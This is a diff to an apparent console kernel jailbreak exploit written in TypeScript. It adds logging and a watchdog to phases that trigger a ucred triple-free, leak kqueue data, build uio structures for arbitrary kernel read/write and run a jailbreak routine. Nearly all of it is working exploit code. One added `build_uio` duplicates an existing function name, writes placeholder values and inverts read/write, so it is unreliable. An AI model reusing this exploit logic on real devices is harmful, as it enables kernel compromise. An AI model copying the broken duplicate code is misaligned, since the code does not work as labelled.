@@ -1285,29 +1285,37 @@ function setup_log_screen () {
 }
 
 /* ===========================
-  *   Watchdog (progress monitor)
-  * ===========================
-  */
+ *   Watchdog (progress monitor)
+ * =========================== */
+
 let WATCHDOG_LAST_TICK = Date.now()
 let WATCHDOG_ACTIVE = false
 
-function watchdog_tick (label: string): void {
+function watchdog_tick(label: string): void {
   WATCHDOG_LAST_TICK = Date.now()
   log('[WD] tick: ' + label)
 }
 
-function watchdog_start (timeoutMs: number = 5000): void {
+function watchdog_start(timeoutMs: number = 5000): void {
   if (WATCHDOG_ACTIVE) return
+
   WATCHDOG_ACTIVE = true
+  log('[FLOW] Watchdog started (timeout = ' + timeoutMs + 'ms)')
 
   const id = jsmaf.setInterval(() => {
     const delta = Date.now() - WATCHDOG_LAST_TICK
+
     if (delta > timeoutMs) {
       log('[WD] TIMEOUT — no progress for ' + delta + 'ms')
+      log('[FLOW] Watchdog triggered fallback → exploit_phase_trigger')
+
       WATCHDOG_ACTIVE = false
       jsmaf.clearInterval(id)
-      // نرجع خطوة آمنة في الفلو بدل السكوت
+
+      // رجوع آمن للفلو
       yield_to_render(exploit_phase_trigger)
+
+      log('[FLOW] Watchdog stopped after timeout')
     }
   }, 500)
 }
@@ -1594,13 +1602,17 @@ function leak_kqueue (): boolean {
   * ===========================
   */
 
-function build_uio (
+function build_uio(
   uio_iov: BigInt,
   offset: number,
-  is_read: boolean,
+  read: boolean,
   addr: BigInt,
   size: number
 ): void {
+
+  log('[UIO] build_uio called')
+  log(`[UIO] addr=${addr} size=${size} offset=${offset}`)
+
   // msg_iov[0].iov_base = addr
   write64(msgIov.add(0x00), addr)
   // msg_iov[0].iov_len = size
@@ -1612,22 +1624,85 @@ function build_uio (
   write64(msgIov.add(0x18), size)
 
   // msg_iov pointer + length
-  write64(msg.add(0x10), msgIov) // msg_iov
-  write64(msg.add(0x18), 2)           // msg_iovlen = 2
+  write64(msg.add(0x10), msgIov)
+  write64(msg.add(0x18), 2)
 
   // msg_name = NULL
-  write64(msg.add(0x00), new BigInt(0))
-  // msg_namelen = 0
+  write64(msg.add(0x00), 0n)
   write32(msg.add(0x08), 0)
 
   // msg_control = NULL
-  write64(msg.add(0x20), new BigInt(0))
-  // msg_controllen = 0
+  write64(msg.add(0x20), 0n)
   write64(msg.add(0x28), 0)
 
   // msg_flags = 0
   write32(msg.add(0x2C), 0)
+
+  log('[UIO] build_uio done')
 }
+
+
+function build_uio(
+  uio: BigInt,
+  uio_iov: BigInt,
+  uio_td: number,
+  read: boolean,
+  addr: BigInt,
+  size: number
+) {
+  log('[UIO] build_uio ENTER')
+
+  // --- Debug incoming values ---
+  log(`[UIO] uio       = ${uio}`)
+  log(`[UIO] uio_iov   = ${uio_iov}`)
+  log(`[UIO] uio_td    = ${uio_td}`)
+  log(`[UIO] read       = ${read}`)
+  log(`[UIO] addr      = ${addr}`)
+  log(`[UIO] size    = ${size}`)
+
+  // --- Basic validation ---
+  if (!uio || !uio_iov) {
+    log('[UIO] ERROR: uio or uio_iov is NULL')
+  }
+  if (!addr) {
+    log('[UIO] WARNING: addr is NULL')
+  }
+  if (size <= 0) {
+    log('[UIO] WARNING: size is invalid')
+  }
+
+  // --- Write fields (placeholders only) ---
+  log('[UIO] writing uio_iov')
+  write64(uio.add(0x00), uio_iov)        // uio_iov
+
+  log('[UIO] writing uio_iovcnt')
+  write64(uio.add(0x08), UIO_IOV_NUM)    // uio_iovcnt
+
+  log('[UIO] writing uio_offset')
+  write64(uio.add(0x10), BigInt_Error)   // uio_offset
+
+  log('[UIO] writing uio_resid')
+  write64(uio.add(0x18), size)           // uio_resid
+
+  log('[UIO] writing uio_segflg')
+  write32(uio.add(0x20), UIO_SYSSPACE)   // uio_segflg
+
+  log('[UIO] writing uio_rw')
+  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ) // uio_segflg
+
+  log('[UIO] writing uio_td')
+  write64(uio.add(0x28), uio_td)         // uio_td
+
+  // --- iov entry ---
+  log('[UIO] writing iov_base')
+  write64(uio.add(0x30), addr)           // iov_base
+
+  log('[UIO] writing iov_len')
+  write64(uio.add(0x38), size)           // iov_len
+
+  log('[UIO] build_uio EXIT')
+}
+
 
 function kreadslow (addr: BigInt, size: number): BigInt {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size)
@@ -2218,17 +2293,21 @@ function retry (label: string, attempts: number, fn: () => boolean): boolean {
  * ===========================
  */
 
-function yield_to_render (callback: () => void): void {
-  const id = jsmaf.setInterval(() => {
-    jsmaf.clearInterval(id)
+function yield_to_render(nextPhase) {
+  const phaseName = nextPhase.name || 'anonymous_phase'
+  const scheduledAt = Date.now()
+  log(`[FLOW] Scheduling next phase: ${phaseName} at ${scheduledAt}`)
+
+  setTimeout(() => {
+    const startedAt = Date.now()
+    log(`[FLOW] ENTER ${phaseName} (delay: ${startedAt - scheduledAt}ms)`)
+
     try {
-      callback()
-    } catch (e: unknown) {
-      const err = e as Error
-      log('ERROR: ' + err.message)
-      if (err.stack) log('STACK: ' + err.stack)
-      cleanup()
+      nextPhase()
+    } catch (e) {
+      log(`[FLOW] ERROR inside ${phaseName}: ${e}`)
     }
+
   }, 0)
 }
 
@@ -2240,7 +2319,7 @@ function yield_to_render (callback: () => void): void {
 let exploit_count = 0
 let exploit_end = false
 
-function netctrl_exploit (): void {
+function netctrl_exploit(): void {
   setup_log_screen()
 
   const supported_fw = init()
@@ -2249,14 +2328,15 @@ function netctrl_exploit (): void {
   }
 
   log('Setting up exploit...')
-
   watchdog_start()
   watchdog_tick('netctrl_exploit')
 
+  log('[FLOW] Requesting transition to: exploit_phase_setup')
   yield_to_render(exploit_phase_setup)
 }
 
-function exploit_phase_setup (): void {
+function exploit_phase_setup(): void {
+  log('[FLOW] inside exploit_phase_setup')
   watchdog_tick('exploit_phase_setup')
 
   setup()
@@ -2265,50 +2345,59 @@ function exploit_phase_setup (): void {
   exploit_count = 0
   exploit_end = false
 
+  log('[FLOW] EXIT exploit_phase_setup')
+  log('[FLOW] Requesting transition to: exploit_phase_trigger')
   yield_to_render(exploit_phase_trigger)
 }
 
-function exploit_phase_trigger (): void {
+function exploit_phase_trigger(): void {
+  log('[FLOW] inside exploit_phase_trigger')
   watchdog_tick('exploit_phase_trigger')
 
-  // Stop if we exceeded max attempts
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W')
     cleanup()
-    return
+    return   // ← نهاية طبيعية
   }
 
   exploit_count++
   log(`[TRIGGER] Triggering vulnerability (${exploit_count}/${MAIN_LOOP_ITERATIONS})`)
 
-  // Run triple free phase
   const ok = trigger_ucred_triplefree()
   if (!ok) {
     log('[TRIGGER] Triple free failed, retrying...')
+    log('[FLOW] Early exit from phase')
+    log('[FLOW] Requesting transition to: exploit_phase_trigger')
     yield_to_render(exploit_phase_trigger)
     return
   }
 
-  // Triple free succeeded → move to leak phase
   log('[TRIGGER] Triple free succeeded, moving to leak phase...')
+  log('[FLOW] EXIT exploit_phase_trigger')
+  log('[FLOW] Requesting transition to: exploit_phase_leak')
   yield_to_render(exploit_phase_leak)
 }
 
-function exploit_phase_leak (): void {
+function exploit_phase_leak(): void {
+  log('[FLOW] inside exploit_phase_leak')
   watchdog_tick('exploit_phase_leak')
-  log('[LEAK] ENTER exploit_phase_leak')
 
   if (!leak_kqueue()) {
     log('[LEAK] leak_kqueue failed, retrying trigger...')
+    log('[FLOW] Early exit from phase')
+    log('[FLOW] Requesting transition to: exploit_phase_trigger')
     yield_to_render(exploit_phase_trigger)
     return
   }
 
   log('Setting up arbitrary R/W...')
+  log('[FLOW] EXIT exploit_phase_leak')
+  log('[FLOW] Requesting transition to: exploit_phase_rw')
   yield_to_render(exploit_phase_rw)
 }
 
-function exploit_phase_rw (): void {
+function exploit_phase_rw(): void {
+  log('[FLOW] inside exploit_phase_rw')
   watchdog_tick('exploit_phase_rw')
   log('[RW] exploit_phase_rw: enter')
 
@@ -2316,21 +2405,32 @@ function exploit_phase_rw (): void {
 
   if (!ok) {
     log('[RW] setup_arbitrary_rw failed after retries, restarting trigger phase')
+    log('[FLOW] Early exit from phase')
+    log('[FLOW] Requesting transition to: exploit_phase_trigger')
     yield_to_render(exploit_phase_trigger)
     return
   }
 
   log('Jailbreaking...')
+  log('[FLOW] EXIT exploit_phase_rw')
+  log('[FLOW] Requesting transition to: exploit_phase_jailbreak')
   yield_to_render(exploit_phase_jailbreak)
 }
 
-function exploit_phase_jailbreak (): void {
+function exploit_phase_jailbreak(): void {
+  log('[FLOW] inside exploit_phase_jailbreak')
   watchdog_tick('exploit_phase_jailbreak')
+
   jailbreak()
+
+  log('[FLOW] EXIT exploit_phase_jailbreak')
 }
 
-function exploit_phase_finish (): void {
-  if (exploit_end) return
+function exploit_phase_finish(): void {
+  if (exploit_end) {
+    log('[FLOW] Early exit from phase')
+    return
+  }
 
   exploit_end = true
   log('Exploit completed successfully')
